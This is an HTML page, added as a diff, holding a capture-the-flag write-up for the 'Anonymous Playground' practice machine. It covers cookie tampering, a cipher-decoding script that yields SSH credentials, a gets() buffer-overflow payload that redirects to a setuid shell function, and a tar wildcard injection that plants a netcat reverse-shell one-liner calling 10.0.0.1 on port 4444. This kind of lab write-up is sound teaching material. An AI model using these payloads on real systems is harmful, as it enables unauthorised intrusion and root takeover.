@@ -1,0 +1,269 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta name="robots" content="index,follow" />
+    <meta name="description" content="agent" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="stylesheet" href="css/style.css"/>
+    <title>Anonymous Playground</title>
+  </head>
+  <body>
+    <nav id="header">
+      <h5><strong>Anonymous Playground</strong></h5>
+
+      <ul>
+          <a href="/">home</a>
+          <a href="/writeups/">writeups</a>
+      </ul>
+    </nav>
+    <div>
+        <h1 class="title">gathering informations</h1>
+        <!-- write_up -->
+        <div class="text">
+            <p class="title"><b>nmap:</b></p>
+            <ul class="writeup">
+                <pre><code class="language-sh"><b style="color:#57f199;">sudo nmap</b><b style="color:#505a7a;"> -sS -sC -sV -v</b><b> &lt;MACHINE_IP&gt;</b></code></pre>
+                <p>-Pn: Disables host discovery.</p></li>
+                <p>-sV: Performs version detection for the services.</p></li>
+                <p>-sC: Performs a script scan using default scripts available in NMAP.</p></li>
+                <p>-v: Provides verbose details about the NMAP scan</p></li>
+            </ul>
+          <div class="writeup" >
+            <p><br>
+            <p class="title"><b>results:</b></p>
+
+            the scan found two open posts <b> port 80(http) </b> and <b>port 22(ssh)</b>
+            </p>
+          </div>
+        </div>
+        <h1 class="title">web http</h1>
+        <div class="text">
+          <div class="writeup" >
+            I decided to check the website hosted on port 80, I found the home page and a page called
+            operatives i found a list of what appear to be usernames (<a target="_" href="https://tryhackme.com/p/Sq00ky">sp00ky</a> help in room creation)
+          </p><br>
+              <img src="media/list.png" alt="usernames" />
+              <br><br>
+              <p>i found &quot;/zYdHuAKjP&quot; in nmap results</p><br>
+              <img src="media/nmap.png" alt="/zYdHuAKjP" /><br>
+              <p>when i open it on port 80 i found this page that has access denied</p>
+              <br>
+              <img src="media/denied.png" alt="denied" />
+              <br><br>
+              <p>Using the developer tools in firefox, I was able to find a cookie called
+              access which has it’s value set to denied</p>
+              <br>
+          <img src="media/cookie.png" alt="cookie" />
+            <p><br>
+              I changed this value to granted, and then reloaded the page. This worked and I
+              was presented with a new message on the web page.
+            </p><br>
+            <img src="media/granted.png" alt="granted" />
+          </div>
+        </div>
+        <h1 class="title">Decoding The Cipher</h1>
+        <div class="text">
+          <div class="writeup" >
+            <p>
+              It looks like there is some kind of cipher encrypted message on the page which
+              looks like possible credentials (i.e. username::password). After spending some
+              time on trying to decipher the message, I decided to look at the hint
+            </p><br>
+                <p>
+                  <strong>Hint</strong>: You’re going to want to write a
+                  <strong>Python</strong> script for this. <strong>‘zA’ = ‘a’</strong><br>
+               </p>
+            <p><br>
+              According to the hint, “zA = a”. After a brain storming, I realized that if
+              you change the letters to their ordered numerical position in the alphabet and
+              added them together, then you would get a new value which would represent the
+              ordered numerical position of another letter in the alphabet. The examples
+              below shows this.
+            </p><br><br>
+
+            <!-- EXAMPLE 1 -->
+            <p style="text-align: left;" class="title"><b>example 1</b></p>
+            <pre style="text-align: left;"><code>
+                'z' = 26 # 26th letter in the alphabet
+                'A' = 1 # 1st letter in the alphabet(26 + 1) % 26 = 1 = 'a'
+
+            <p style="text-align: left;" class="title"><b>example 2</b></p>
+                'h' = 8
+                'E' = 5(8 + 5) % 26 = 13 = 'm'
+
+                N.B. Mod (i.e. '%') 26 is used since there are only 26 letters in the alphabet.
+            </code></pre>
+            <p style="text-align: left;" class="title"><b>script</b></p>
+            <p></br>
+              It is possible to perform these calculations manually but I decided to write a
+              simple python script to do it with the help of some online sources
+            </p>
+            <pre style="text-align: left;margin-left: 50px;" ><code class="language-python">
+<code style="color: #6e6efe; ">#! /bin/python3.8 </code>
+
+<code style="color: #89ddff;">def</code> <code style="color: #e98567;">deciphering</code><code style="color: #57f199;">(</code>str<code style="color: #57f199;">)</code>:
+    list1 = <code style="color: #57f199;">[]</code>
+    a = <code style="color: #57f199;">&quot;&quot;</code>
+    <code style="color: #89ddff;">for</code> i <code style="color: #89ddff;">in</code> str:
+        list1.append<code style="color: #57f199;">((</code>ord<code style="color: #57f199;">(</code>i<code style="color: #57f199;">)</code> &amp; <code style="color: #b797ca;">31</code><code style="color: #57f199;">))</code>
+
+    res = <code style="color: #57f199;">[]</code>
+
+    <code style="color: #89ddff;">for</code> ele <code style="color: #89ddff;">in</code> <code style="color: #e98567;">range</code><code style="color: #57f199;">(</code><code style="color: #b797ca;">0</code>, <code style="color: #e98567;">len</code><code style="color: #57f199;">(</code>list1<code style="color: #57f199;">)</code>, <code style="color: #b797ca;">2</code><code style="color: #57f199;">)</code>:
+        res.<code style="color: #e98567;">append</code><code style="color: #57f199;">((</code>list1<code style="color: #57f199;">[</code>ele<code style="color: #57f199;">]</code> + list1<code style="color: #57f199;">[</code>ele + 1<code style="color: #57f199;">])</code> % <code style="color: #b797ca;">26</code><code style="color: #57f199;">)</code>
+
+    <code style="color: #89ddff;">for</code> i <code style="color: #89ddff;">in</code> <code style="color: #e98567;">range</code><code style="color: #57f199;">(</code><code style="color: #e98567;">len</code><code style="color: #57f199;">(</code>res<code style="color: #57f199;">))</code>:
+        tmp = <code style="color: #e98567;">chr</code><code style="color: #57f199;">(</code>res<code style="color: #57f199;">[</code>i<code style="color: #57f199;">]</code> + <code style="color: #b797ca;">64</code><code style="color: #57f199;">)</code>.<code style="color: #e98567;">lower</code><code style="color: #57f199;">()</code>
+        <code style="color: #e98567;">print</code><code style="color: #57f199;">(</code>tmp, end=<code style="color: #57f199;">&quot; &quot;)</code>
+
+username = <code style="color: #57f199;">&quot;hEzAdCfHzA&quot;</code>
+<code style="color: #e98567;">deciphering</code><code style="color: #57f199;">(</code>username<code style="color: #57f199;">)</code>
+<code style="color: #e98567;">print</code><code style="color: #57f199;">(&quot;::&quot;</code>, end=<code style="color: #57f199;">&quot; &quot;)</code>
+password = <code style="color: #57f199;">&quot;hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN&quot;</code>
+<code style="color: #e98567;">deciphering</code><code style="color: #57f199;">(</code>password<code style="color: #57f199;">)</code>
+            </code></pre>
+
+            <p>
+              Running this script gives me a username and password. If I look at the list of
+              operatives seen earlier when examining the website, I can also see that the
+              username is present in the list
+            </p>
+            <img src="media/username&amp;password.png" alt="username&amp;password" />
+            <p>
+              Using these credentials, I can SSH into the target machine and retrieve the
+              first user flag.
+            </p>
+          </div>
+        </div>
+        <h1 class="title">User Privilege Escalation</h1>
+        <div class="text">
+          <div class="writeup" >
+            <p>
+              I found a binary executable called “<strong>hacktheworld</strong>” and a text
+              file called “<strong>note_from_spooky.txt</strong>” in the
+              <strong>magna user’s home directory</strong>. The text file contains the
+              message seen in the image below.
+            </p>
+            <img src="media/message.png" alt="message" />
+            <p>
+              I decided to use scp to copy the file to my local machine for further
+              analysis.
+            </p><br>
+            <pre><code class="language-sh"><b style="color:#57f199;">scp </b><b>magna@10.10.77.16:/home/magna/hcktheworld</b></code></pre><br>
+            <p>
+              Using Ghidra, I started examining the binary by looking at it’s main function.
+              The code creates a char buffer of 64 bytes in size. The program then uses the
+              function “gets()” to take my input. This vulnerable C function can be
+              exploited to cause a buffer overflow.
+            </p><br>
+            <img src="media/main.png" alt="main" />
+            <p><br>
+              I found a second function called “call_bash”, which is not referenced in the
+              main function. This function prints several messages before using the function
+              “setuid()” to set the effective user ID of the calling process. A new shell is
+              then created under the set user ID.
+            </p><br>
+            <img src="media/call_bash.png" alt="call_bash" />
+            <p><br>
+              I can exploit the vulnerable C function “gets()” to cause a buffer overflow
+              and overwrite the return address on the stack with the address of the
+              “call_bash” function. To find the size of the buffer and how many “A” I would
+              need to overwrite it, I used python to supply input and identify the exact
+              amount of “A” that would cause the program to crash. This involves some trial
+              and error.
+            </p><br>
+            <img src="media/buff1.png" alt="buff1" />
+
+            <p><br>
+              I found supplying 72 “A” would cause the segmentation fault to occur and
+              anything less would not result in the program crashing. Next, I used “readelf”
+              and “grep” to find the memory address of the “call_bash” function.
+            </p><br>
+
+            <pre><code class="language-sh"><b style="color:#57f199;">readelf </b><b style="color:#505a7a;">-s </b> hacktheworld | </b><b style="color:#57f199;">grep </b><b style="color:#505a7a;">-i </b><b> &quot;call_bash&quot;</b></code></pre>
+            <p><br>
+              This provided the following address seen below for the function “call_bash”.
+            </p><br>
+            <img src="media/call_bash_addr.png" alt="call_bash_addr" />
+            <p><br>
+              I can now attach this memory address in hex format, while still keeping the
+              endianness of the function written in memory, to the end of my 72 “A”
+            </p>
+            <ul>
+                <br><strong>python2</strong> :<br><br>
+                <pre><code class="language-sh"><b style="color:#57f199;">python2 </b><b style="color:#505a7a;">-c</b> <b style="color:#e98567"> 'print &quot;A&quot;*72 + b&quot;\x58\x06\x40\x00\x00\x00\x00\x00&quot;'</b> <code class="language-sh"><b style="color:#57f199;">| ./hacketheworld</b></code></pre>
+                <br><strong>python3</strong> :<br><br>
+                <pre><code class="language-sh"><code class="language-sh"><b style="color:#57f199;">python3 </b><b style="color:#505a7a;">-c </b><b style="color:#e98567">'print(&quot;A&quot;*72 + &quot;\x58\x06\x40\x00\x00\x00\x00\x00&quot;)' </b><code class="language-sh"><b style="color:#57f199;">| ./hacketheworld</b></code></pre>
+            </ul><br>
+
+            <p>
+              This works and I have escalated my privileges successfully to the user spooky.
+            </p><br>
+            <img src="media/spooky.png" alt="spooky" />
+            <p><br>
+              I use python to import the pty module and create a fully interactive TTY shell
+              as seen below.
+            </p><br>
+            <pre><code class="language-sh"><b style="color:#57f199;">python </b><b style="color:#505a7a;">-c </b> <b style="color:#e98567">'import pty; pty.spawn(&quot;/bin/sh&quot;)'</b></code></pre>
+            <br>
+            <p>
+              After this, I navigate to the user spooky’s home directory and get the second
+              user flag.<br>
+            </p>
+          </div>
+        </div>
+        <h1 class="title">Root Privilege Escalation</h1>
+        <div class="text">
+          <div class="writeup" >
+        <p>
+          Now that I have both user flags, I started looking for anyway to escalate my
+          privileges to root. While looking for privilege escalation exploits, I decided
+          to check if there were any interesting cronjobs running.
+        </p><br>
+        <img src="media/crontab.png" alt="crontab" />
+        <p><br>
+          I saw an interesting cronjob being ran by the user root. This cronjob executes
+          a series of commands which archives all the files located in the user spooky’s
+          home directory into a tar file. After searching for a way to escalate my
+          privileges using a tar file, I came across an article called “Exploiting
+          Wildcard for Privilege Escalation” (see references). In this article, I
+          discovered how I could escalate my privileges using a Tar Wildcard Injection
+          by entering the following commands.
+        </p>
+        <pre><code class="language-sh">
+        <b style="color:#57f199;">echo </b><b style="color:#e98567">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4444 &gt;/tmp/f&quot;</b><b style="color:#57f199;"> &gt; shell.sh</b>
+
+        <b style="color:#57f199;">echo </b><b style="color:#e98567">&quot;&quot;</b><b style="color:#57f199;">&gt;</b><b style="color:#e98567"> &quot;--checkpoint-action=exec=sh shell.sh&quot;</b>
+
+        <b style="color:#57f199;">echo </b><b style="color:#e98567">&quot;&quot; &gt; </b><b style="color:#505a7a;">--checkpoint=1</b></code></pre>
+        <br>
+        <ul style="text-align: left; margin-left: 10%;"><br>
+            <p>The commands work as follows:</p>
+           .) Create a reverse shell and store it in a file called shell.sh.<br><br>
+           .) –checkpoint[=NUMBER] show progress messages every Numbers record (default 10).<br><br>
+           .) –checkpoint-action=ACTION execute ACTION on each checkpoint. Runs the file
+           shell.sh after the first file is archived. Since the tar command is running
+           as root due to crontab, this has the effect of spawning a netcat shell and
+           sending it to the attack platform on port 4444.
+        </ul>
+        <p><br>
+          Next, I setup a netcat listener on my host device for any incoming connections
+          on port 4444.
+        </p><br>
+        <pre><code class="language-sh"><b style="color:#57f199;">nc </b><b style="color:#505a7a;">-lvnp</b><b> 4444</b></code></pre>
+        <p><br>
+          After a few minutes, I get a reverse shell with root privileges. I can then
+          change to the root directory and get the final root user flag
+        </p><br>
+        <img src="media/root.png" alt="root" />
+        <br>
+          </div>
+        </div>
+    </div>
+    <footer id="copyright" >
+        <p> all right reversed to abdellatifdev.xyz </p>
+    </footer>
+  </body>
+</html>
